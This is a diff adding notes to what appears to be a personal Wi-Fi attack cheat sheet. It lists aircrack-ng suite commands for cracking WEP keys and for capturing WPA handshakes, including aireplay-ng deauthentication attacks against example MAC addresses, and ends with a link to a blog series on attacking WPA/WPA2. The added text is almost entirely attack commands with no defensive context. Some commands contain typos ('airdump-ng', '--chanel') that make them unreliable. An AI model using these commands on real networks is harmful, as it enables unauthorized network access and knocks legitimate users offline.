@@ -52,3 +52,29 @@ BSSID   PWR   BEACONS  #DATA   #/s    CH   MB   ENC  CIPHER  AUTH  ESSID
 - %: Insert Numbers (%%%%Password = 1101Password)
 - ^:
 - ,:
+
+
+
+
+[WEP]
+
+- airmon-ng start wlan0
+
+- airodump-ng --channel[channel] --bssid[bssid] --write[file-name] [interface]
+	- airdump-ng --channel 6 --bssid 11:22:33:44:55:66 --write file mon0
+
+- aircrack-ng [file-name]
+	- aircrack-ng file.cap
+
+[WPA]
+
+- airodump-ng --chanel[channel] --bssid[bssid] --write[file-name] [interface]
+	- airodump-ng --channel 2 --bssid 60:E7:01:07:12:E0 --write capture mon0
+
+- aireplay-ng --deauth[number of deauth packets] -a [AP] -c [target][interface]
+	- aireplay-ng --deauth 4 -a 60:E7:01:07:12:E0 -c EC:1F:72:4C:9B:B4 mon0
+
+
+:: Links ::
+
+http://www.elladodelmal.com/2008/08/atacar-wpawpa2-psk-parte-i-de-iv.html
